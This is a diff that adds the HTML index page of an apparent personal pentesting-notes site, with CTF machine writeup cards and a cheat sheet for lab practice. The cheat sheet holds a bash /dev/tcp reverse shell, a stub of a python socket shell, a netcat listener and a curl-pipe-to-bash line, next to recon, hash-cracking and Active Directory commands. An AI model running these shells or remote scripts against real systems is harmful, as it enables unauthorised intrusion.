@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>0xRoot — Pentesting Notes</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Space+Grotesk:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1117;
+    --bg3: #161b22;
+    --surface: #1c2128;
+    --surface2: #22272e;
+    --border: #30363d;
+    --green: #39d353;
+    --green-dim: #1f6b2e;
+    --green-glow: rgba(57,211,83,0.15);
+    --text: #e6edf3;
+    --muted: #7d8590;
+    --accent: #58a6ff;
+    --red: #f85149;
+    --orange: #ffa657;
+    --purple: #bc8cff;
+    --yellow: #e3b341;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Space Grotesk', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  ::selection { background: var(--green-dim); color: var(--green); }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.03) 2px,
+      rgba(0,0,0,0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── SIDEBAR ── */
+  .sidebar {
+    position: fixed;
+    left: 0; top: 0; bottom: 0;
+    width: 260px;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    z-index: 100;
+    overflow-y: auto;
+  }
+
+  .sidebar-logo {
+    padding: 24px 20px 20px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .logo-tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--green);
+    margin-bottom: 6px;
+    letter-spacing: 0.05em;
+  }
+
+  .logo-name {
+    font-family: var(--mono);
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: -0.02em;
+  }
+
+  .logo-name span { color: var(--green); }
+
+  .logo-sub {
+    font-size: 12px;
+    color: var(--muted);
+    margin-top: 4px;
+    font-family: var(--mono);
+  }
+
+  .sidebar-section {
+    padding: 16px 12px 8px;
+  }
+
+  .section-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    padding: 0 8px;
+    margin-bottom: 6px;
+  }
+
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 10px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 13px;
+    font-family: var(--mono);
+    color: var(--muted);
+    transition: all 0.15s;
+    text-decoration: none;
+    position: relative;
+    user-select: none;
+  }
+
+  .nav-item:hover {
+    background: var(--surface);
+    color: var(--text);
+  }
+
+  .nav-item.active {
+    background: var(--green-glow);
+    color: var(--green);
+    border: 1px solid rgba(57,211,83,0.3);
+  }
+
+  .nav-icon {
+    font-size: 14px;
+    width: 18px;
+    text-align: center;
+    flex-shrink: 0;
+  }
+
+  .nav-badge {
+    margin-left: auto;
+    font-size: 10px;
+    background: var(--surface2);
+    color: var(--muted);
+    padding: 2px 6px;
+    border-radius: 10px;
+    font-family: var(--mono);
+  }
+
+  .nav-item.active .nav-badge {
+    background: var(--green-dim);
+    color: var(--green);
+  }
+
+  .sidebar-footer {
+    margin-top: auto;
+    padding: 16px;
+    border-top: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .status-dot {
+    display: inline-block;
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--green);
+    margin-right: 6px;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  /* ── MAIN ── */
+  .main {
+    margin-left: 260px;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* ── TOP BAR ── */
+  .topbar {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 32px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+    position: sticky;
+    top: 0;
+    z-index: 50;
+  }
+
+  .breadcrumb span { color: var(--green); }
+  .breadcrumb { flex: 1; }
+
+  .topbar-actions {
+    display: flex;
+    gap: 12px;
+    align-items: center;
+  }
+
+  .tag {
+    padding: 3px 10px;
+    border-radius: 4px;
+    font-size: 11px;
+    font-family: var(--mono);
+    border: 1px solid;
+  }
+
+  .tag-green { background: rgba(57,211,83,0.1); color: var(--green); border-color: rgba(57,211,83,0.3); }
+  .tag-red { background: rgba(248,81,73,0.1); color: var(--red); border-color: rgba(248,81,73,0.3); }
+  .tag-blue { background: rgba(88,166,255,0.1); color: var(--accent); border-color: rgba(88,166,255,0.3); }
+  .tag-orange { background: rgba(255,166,87,0.1); color: var(--orange); border-color: rgba(255,166,87,0.3); }
+  .tag-purple { background: rgba(188,140,255,0.1); color: var(--purple); border-color: rgba(188,140,255,0.3); }
+
+  /* ── CONTENT ── */
+  .content {
+    padding: 40px 48px;
+    flex: 1;
+  }
+
+  /* ── HERO TERMINAL ── */
+  .terminal {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin-bottom: 40px;
+  }
+
+  .terminal-bar {
+    background: var(--surface);
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .dot { width: 12px; height: 12px; border-radius: 50%; }
+  .dot-r { background: #ff5f57; }
+  .dot-y { background: #febc2e; }
+  .dot-g { background: #28c840; }
+
+  .terminal-title {
+    margin-left: 8px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+  }
+
+  .terminal-body {
+    padding: 24px 28px;
+    font-family: var(--mono);
+    font-size: 14px;
+    line-height: 2;
+  }
+
+  .t-prompt { color: var(--green); }
+  .t-cmd { color: var(--text); }
+  .t-out { color: var(--muted); }
+  .t-val { color: var(--accent); }
+  .t-str { color: var(--orange); }
+  .t-comment { color: #3d4450; }
+  .cursor {
+    display: inline-block;
+    width: 8px; height: 16px;
+    background: var(--green);
+    vertical-align: middle;
+    animation: blink 1.1s step-end infinite;
+    margin-left: 2px;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* ── SECTION HEADER ── */
+  .section-header {
+    display: flex;
+    align-items: baseline;
+    gap: 14px;
+    margin-bottom: 24px;
+  }
+
+  .section-title {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--green);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+  }
+
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(to right, var(--border), transparent);
+  }
+
+  /* ── MACHINE GRID ── */
+  .machines-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 16px;
+    margin-bottom: 48px;
+  }
+
+  .machine-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-decoration: none;
+    display: block;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .machine-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: var(--border);
+    transition: background 0.2s;
+  }
+
+  .machine-card:hover {
+    border-color: rgba(57,211,83,0.4);
+    background: var(--surface);
+    transform: translateY(-2px);
+  }
+
+  .machine-card:hover::before { background: var(--green); }
+  .machine-card.hard::before { background: var(--red); }
+  .machine-card.medium::before { background: var(--orange); }
+  .machine-card.easy::before { background: var(--green); }
+  .machine-card.insane::before { background: var(--purple); }
+
+  .machine-card:hover.hard { border-color: rgba(248,81,73,0.4); }
+  .machine-card:hover.medium { border-color: rgba(255,166,87,0.4); }
+  .machine-card:hover.insane { border-color: rgba(188,140,255,0.4); }
+
+  .machine-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    margin-bottom: 12px;
+  }
+
+  .machine-name {
+    font-family: var(--mono);
+    font-size: 16px;
+    font-weight: 500;
+    color: var(--text);
+  }
+
+  .machine-os {
+    font-size: 11px;
+    font-family: var(--mono);
+    color: var(--muted);
+    margin-top: 3px;
+  }
+
+  .machine-meta {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+    margin-top: 12px;
+  }
+
+  .machine-points {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+    margin-top: 10px;
+    display: flex;
+    gap: 16px;
+  }
+
+  .machine-points span { color: var(--text); }
+
+  /* ── CHEATSHEET ── */
+  .cheatsheet-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 16px;
+    margin-bottom: 48px;
+  }
+
+  .cheat-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+  }
+
+  .cheat-header {
+    padding: 14px 18px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .cheat-title {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text);
+    font-weight: 500;
+  }
+
+  .cheat-body {
+    padding: 16px 18px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .cmd-line {
+    background: var(--surface2);
+    border-radius: 5px;
+    padding: 8px 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: copy;
+    transition: all 0.15s;
+    border: 1px solid transparent;
+  }
+
+  .cmd-line:hover {
+    background: var(--surface);
+    border-color: var(--border);
+    color: var(--text);
+  }
+
+  .cmd-line:hover .copy-hint { opacity: 1; }
+
+  .cmd-dollar { color: var(--green); flex-shrink: 0; }
+
+  .cmd-text { flex: 1; }
+  .cmd-text .kw { color: var(--accent); }
+  .cmd-text .arg { color: var(--orange); }
+  .cmd-text .flag { color: var(--purple); }
+  .cmd-text .tgt { color: var(--yellow); }
+
+  .copy-hint {
+    font-size: 10px;
+    color: var(--muted);
+    opacity: 0;
+    transition: opacity 0.15s;
+    flex-shrink: 0;
+  }
+
+  /* ── STATS BAR ── */
+  .stats-row {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+    margin-bottom: 40px;
+  }
+
+  .stat-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px;
+    text-align: center;
+  }
+
+  .stat-num {
+    font-family: var(--mono);
+    font-size: 32px;
+    font-weight: 700;
+    color: var(--green);
+    line-height: 1;
+  }
+
+  .stat-label {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+  }
+
+  /* ── TOOLS SECTION ── */
+  .tools-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 12px;
+    margin-bottom: 48px;
+  }
+
+  .tool-item {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text);
+    transition: all 0.15s;
+    cursor: default;
+  }
+
+  .tool-item:hover {
+    border-color: rgba(88,166,255,0.4);
+    background: var(--surface);
+    color: var(--accent);
+  }
+
+  .tool-icon {
+    width: 28px; height: 28px;
+    background: var(--surface2);
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    flex-shrink: 0;
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 20px 48px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  footer a { color: var(--green); text-decoration: none; }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--surface2); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--border); }
+</style>
+</head>
+<body>
+
+<!-- ── SIDEBAR ── -->
+<aside class="sidebar">
+  <div class="sidebar-logo">
+    <div class="logo-tag">// pentesting notes</div>
+    <div class="logo-name"><span>0x</span>Root</div>
+    <div class="logo-sub">~/writeups &amp; cheatsheets</div>
+  </div>
+
+  <div class="sidebar-section">
+    <div class="section-label">navigation</div>
+    <a href="#" class="nav-item active">
+      <span class="nav-icon">⌂</span> Dashboard
+    </a>
+    <a href="#machines" class="nav-item">
+      <span class="nav-icon">◈</span> Writeups
+      <span class="nav-badge">12</span>
+    </a>
+    <a href="#cheatsheets" class="nav-item">
+      <span class="nav-icon">≡</span> Cheatsheets
+      <span class="nav-badge">8</span>
+    </a>
+    <a href="#tools" class="nav-item">
+      <span class="nav-icon">⚙</span> Tools
+    </a>
+  </div>
+
+  <div class="sidebar-section">
+    <div class="section-label">difficulty</div>
+    <a href="#" class="nav-item">
+      <span class="nav-icon" style="color:var(--green)">●</span> Easy
+      <span class="nav-badge">5</span>
+    </a>
+    <a href="#" class="nav-item">
+      <span class="nav-icon" style="color:var(--orange)">●</span> Medium
+      <span class="nav-badge">4</span>
+    </a>
+    <a href="#" class="nav-item">
+      <span class="nav-icon" style="color:var(--red)">●</span> Hard
+      <span class="nav-badge">2</span>
+    </a>
+    <a href="#" class="nav-item">
+      <span class="nav-icon" style="color:var(--purple)">●</span> Insane
+      <span class="nav-badge">1</span>
+    </a>
+  </div>
+
+  <div class="sidebar-section">
+    <div class="section-label">os</div>
+    <a href="#" class="nav-item">
+      <span class="nav-icon">🐧</span> Linux
+    </a>
+    <a href="#" class="nav-item">
+      <span class="nav-icon">🪟</span> Windows
+    </a>
+    <a href="#" class="nav-item">
+      <span class="nav-icon">📦</span> Active Directory
+    </a>
+  </div>
+
+  <div class="sidebar-footer">
+    <div><span class="status-dot"></span>vpn connected</div>
+    <div style="margin-top:4px; color: var(--accent)">10.10.14.22</div>
+  </div>
+</aside>
+
+<!-- ── MAIN ── -->
+<main class="main">
+  <div class="topbar">
+    <div class="breadcrumb">
+      <span>~</span>/writeups/
+    </div>
+    <div class="topbar-actions">
+      <span class="tag tag-orange">HTB</span>
+      <span class="tag tag-blue">TryHackMe</span>
+      <span class="tag tag-green">OSCP prep</span>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- TERMINAL HERO -->
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div>
+        <div class="dot dot-y"></div>
+        <div class="dot dot-g"></div>
+        <span class="terminal-title">0xRoot@kali — bash</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">┌──(</span><span class="t-val">0xRoot</span><span class="t-prompt">㉿kali)</span><span class="t-prompt">-[</span><span class="t-str">~/writeups</span><span class="t-prompt">]</span></div>
+        <div><span class="t-prompt">└─$</span> <span class="t-cmd">whoami</span></div>
+        <div class="t-out">&nbsp;&nbsp;→ pentester | CTF player | bug hunter</div>
+        <div><span class="t-prompt">└─$</span> <span class="t-cmd">ls -la ./notes</span></div>
+        <div class="t-out">&nbsp;&nbsp;12 writeups &nbsp;&nbsp;8 cheatsheets &nbsp;&nbsp;∞ caffeine</div>
+        <div><span class="t-prompt">└─$</span> <span class="t-cmd">cat motto.txt</span></div>
+        <div class="t-out">&nbsp;&nbsp;<span style="color:var(--green)">"hack the planet, document everything"</span></div>
+        <div><span class="t-prompt">└─$</span> <span class="cursor"></span></div>
+      </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats-row">
+      <div class="stat-card">
+        <div class="stat-num">12</div>
+        <div class="stat-label">Machines Pwned</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num" style="color:var(--orange)">8</div>
+        <div class="stat-label">Cheatsheets</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num" style="color:var(--accent)">3</div>
+        <div class="stat-label">CVEs Studied</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num" style="color:var(--purple)">47</div>
+        <div class="stat-label">Flags Captured</div>
+      </div>
+    </div>
+
+    <!-- WRITEUPS -->
+    <div id="machines">
+      <div class="section-header">
+        <span class="section-title">// writeups</span>
+        <div class="section-line"></div>
+        <span style="font-family:var(--mono);font-size:11px;color:var(--muted)">latest first</span>
+      </div>
+
+      <div class="machines-grid">
+
+        <a class="machine-card easy" href="writeups/thetoppers.html">
+          <div class="machine-top">
+            <div>
+              <div class="machine-name">TheToppers</div>
+              <div class="machine-os">🐧 Linux · Starting Point</div>
+            </div>
+          </div>
+          <div class="machine-meta">
+            <span class="tag tag-green">Easy</span>
+            <span class="tag tag-blue">S3</span>
+            <span class="tag tag-blue">Web</span>
+          </div>
+          <div class="machine-points">
+            user <span>✓</span> &nbsp; root <span>✓</span>
+          </div>
+        </a>
+
+        <a class="machine-card easy" href="writeups/unika.html">
+          <div class="machine-top">
+            <div>
+              <div class="machine-name">Unika</div>
+              <div class="machine-os">🪟 Windows · Starting Point</div>
+            </div>
+          </div>
+          <div class="machine-meta">
+            <span class="tag tag-green">Easy</span>
+            <span class="tag tag-orange">LFI</span>
+            <span class="tag tag-orange">NTLMv2</span>
+          </div>
+          <div class="machine-points">
+            user <span>✓</span> &nbsp; root <span>✓</span>
+          </div>
+        </a>
+
+        <a class="machine-card medium" href="#">
+          <div class="machine-top">
+            <div>
+              <div class="machine-name">Passage</div>
+              <div class="machine-os">🐧 Linux · HackTheBox</div>
+            </div>
+          </div>
+          <div class="machine-meta">
+            <span class="tag tag-orange">Medium</span>
+            <span class="tag tag-blue">CuteNews</span>
+            <span class="tag tag-blue">RCE</span>
+          </div>
+          <div class="machine-points">
+            user <span>✓</span> &nbsp; root <span>✓</span>
+          </div>
+        </a>
+
+        <a class="machine-card hard" href="#">
+          <div class="machine-top">
+            <div>
+              <div class="machine-name">CrossFit</div>
+              <div class="machine-os">🐧 Linux · HackTheBox</div>
+            </div>
+          </div>
+          <div class="machine-meta">
+            <span class="tag tag-red">Hard</span>
+            <span class="tag tag-blue">XSS</span>
+            <span class="tag tag-blue">FTP</span>
+          </div>
+          <div class="machine-points">
+            user <span>✓</span> &nbsp; root <span style="color:var(--muted)">✗</span>
+          </div>
+        </a>
+
+        <a class="machine-card medium" href="#">
+          <div class="machine-top">
+            <div>
+              <div class="machine-name">Active</div>
+              <div class="machine-os">🪟 Windows · HackTheBox</div>
+            </div>
+          </div>
+          <div class="machine-meta">
+            <span class="tag tag-orange">Medium</span>
+            <span class="tag tag-purple">Kerberoast</span>
+            <span class="tag tag-blue">SMB</span>
+          </div>
+          <div class="machine-points">
+            user <span>✓</span> &nbsp; root <span>✓</span>
+          </div>
+        </a>
+
+        <a class="machine-card insane" href="#">
+          <div class="machine-top">
+            <div>
+              <div class="machine-name">Fulcrum</div>
+              <div class="machine-os">🐧 Linux · HackTheBox</div>
+            </div>
+          </div>
+          <div class="machine-meta">
+            <span class="tag tag-purple">Insane</span>
+            <span class="tag tag-blue">Pivoting</span>
+            <span class="tag tag-orange">XXE</span>
+          </div>
+          <div class="machine-points">
+            user <span>✓</span> &nbsp; root <span style="color:var(--muted)">in progress</span>
+          </div>
+        </a>
+
+      </div>
+    </div>
+
+    <!-- CHEATSHEETS -->
+    <div id="cheatsheets">
+      <div class="section-header">
+        <span class="section-title">// cheatsheets</span>
+        <div class="section-line"></div>
+      </div>
+
+      <div class="cheatsheet-grid">
+
+        <div class="cheat-card">
+          <div class="cheat-header">
+            <span class="cheat-title">Recon &amp; Enumeration</span>
+            <span class="tag tag-blue">nmap</span>
+          </div>
+          <div class="cheat-body">
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">nmap</span> <span class="flag">-sC -sV -oN</span> <span class="arg">scan.txt</span> <span class="tgt">&lt;IP&gt;</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">nmap</span> <span class="flag">-p-</span> <span class="flag">--min-rate</span> <span class="arg">10000</span> <span class="tgt">&lt;IP&gt;</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">gobuster</span> dir <span class="flag">-u</span> <span class="tgt">http://IP</span> <span class="flag">-w</span> <span class="arg">common.txt</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">ffuf</span> <span class="flag">-w</span> <span class="arg">subdomains.txt</span> <span class="flag">-u</span> <span class="tgt">http://FUZZ.target.htb</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="cheat-card">
+          <div class="cheat-header">
+            <span class="cheat-title">SMB Enumeration</span>
+            <span class="tag tag-orange">Windows</span>
+          </div>
+          <div class="cheat-body">
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">smbclient</span> <span class="flag">-L</span> <span class="tgt">//&lt;IP&gt;</span> <span class="flag">-N</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">crackmapexec</span> smb <span class="tgt">&lt;IP&gt;</span> <span class="flag">-u</span> <span class="arg">user</span> <span class="flag">-p</span> <span class="arg">pass</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">enum4linux</span> <span class="flag">-a</span> <span class="tgt">&lt;IP&gt;</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="cheat-card">
+          <div class="cheat-header">
+            <span class="cheat-title">Hash Cracking</span>
+            <span class="tag tag-purple">hashcat</span>
+          </div>
+          <div class="cheat-body">
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">hashcat</span> <span class="flag">-m 5600</span> hash.txt <span class="arg">rockyou.txt</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">hashcat</span> <span class="flag">-m 1000</span> ntlm.txt <span class="arg">rockyou.txt</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">john</span> <span class="flag">--wordlist=</span><span class="arg">rockyou.txt</span> hash.txt</span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">hashid</span> <span class="arg">'$hash_here'</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="cheat-card">
+          <div class="cheat-header">
+            <span class="cheat-title">Privilege Escalation</span>
+            <span class="tag tag-red">Linux</span>
+          </div>
+          <div class="cheat-body">
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">sudo</span> <span class="flag">-l</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">find</span> / <span class="flag">-perm -u=s</span> <span class="flag">-type f</span> 2>/dev/null</span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">curl</span> <span class="arg">linpeas.sh</span> | bash</span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">cat</span> /etc/crontab</span>
+              <span class="copy-hint">copy</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="cheat-card">
+          <div class="cheat-header">
+            <span class="cheat-title">Reverse Shells</span>
+            <span class="tag tag-red">shells</span>
+          </div>
+          <div class="cheat-body">
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">bash</span> <span class="flag">-c</span> <span class="arg">'bash -i >& /dev/tcp/IP/4444 0>&1'</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">python3</span> <span class="flag">-c</span> <span class="arg">'import socket...'</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">rlwrap</span> <span class="kw">nc</span> <span class="flag">-lvnp</span> <span class="arg">4444</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="cheat-card">
+          <div class="cheat-header">
+            <span class="cheat-title">Active Directory</span>
+            <span class="tag tag-orange">AD</span>
+          </div>
+          <div class="cheat-body">
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">impacket-GetUserSPNs</span> <span class="tgt">dom/user:pass</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">evil-winrm</span> <span class="flag">-i</span> <span class="tgt">&lt;IP&gt;</span> <span class="flag">-u</span> <span class="arg">user</span> <span class="flag">-p</span> <span class="arg">pass</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+            <div class="cmd-line">
+              <span class="cmd-dollar">$</span>
+              <span class="cmd-text"><span class="kw">bloodhound-python</span> <span class="flag">-d</span> <span class="tgt">dom</span> <span class="flag">-u</span> <span class="arg">user</span></span>
+              <span class="copy-hint">copy</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- TOOLS -->
+    <div id="tools">
+      <div class="section-header">
+        <span class="section-title">// tools &amp; resources</span>
+        <div class="section-line"></div>
+      </div>
+
+      <div class="tools-grid">
+        <div class="tool-item"><div class="tool-icon">🗺</div> Nmap</div>
+        <div class="tool-item"><div class="tool-icon">🐙</div> Gobuster</div>
+        <div class="tool-item"><div class="tool-icon">⚡</div> ffuf</div>
+        <div class="tool-item"><div class="tool-icon">🔑</div> Hashcat</div>
+        <div class="tool-item"><div class="tool-icon">🪝</div> Hydra</div>
+        <div class="tool-item"><div class="tool-icon">💀</div> Metasploit</div>
+        <div class="tool-item"><div class="tool-icon">🩸</div> BloodHound</div>
+        <div class="tool-item"><div class="tool-icon">🐍</div> Impacket</div>
+        <div class="tool-item"><div class="tool-icon">🪟</div> Evil-WinRM</div>
+        <div class="tool-item"><div class="tool-icon">📡</div> Burp Suite</div>
+        <div class="tool-item"><div class="tool-icon">🧨</div> LinPEAS</div>
+        <div class="tool-item"><div class="tool-icon">🦈</div> Wireshark</div>
+      </div>
+    </div>
+
+  </div><!-- /content -->
+
+  <footer>
+    <span><span class="status-dot"></span>0xRoot — pentesting notes &amp; writeups</span>
+    <span>built with <span style="color:var(--red)">♥</span> &amp; <a href="https://github.com" target="_blank">github.io</a></span>
+  </footer>
+</main>
+
+<script>
+  // Copy command on click
+  document.querySelectorAll('.cmd-line').forEach(el => {
+    el.addEventListener('click', () => {
+      const text = el.querySelector('.cmd-text').innerText;
+      navigator.clipboard?.writeText(text).then(() => {
+        const hint = el.querySelector('.copy-hint');
+        if (hint) {
+          hint.textContent = 'copied!';
+          hint.style.color = 'var(--green)';
+          hint.style.opacity = '1';
+          setTimeout(() => {
+            hint.textContent = 'copy';
+            hint.style.color = '';
+            hint.style.opacity = '';
+          }, 1500);
+        }
+      });
+    });
+  });
+
+  // Highlight active nav on scroll
+  const sections = { machines: '.nav-item:nth-child(2)', cheatsheets: '.nav-item:nth-child(3)' };
+  const navItems = document.querySelectorAll('.nav-item');
+  window.addEventListener('scroll', () => {
+    navItems.forEach(n => n.classList.remove('active'));
+    let current = document.querySelector('.nav-item');
+    for (const [id] of Object.entries(sections)) {
+      const el = document.getElementById(id);
+      if (el && window.scrollY >= el.offsetTop - 120) {
+        current = document.querySelector(`a[href="#${id}"]`);
+      }
+    }
+    if (current) current.classList.add('active');
+  });
+</script>
+
+</body>
+</html>
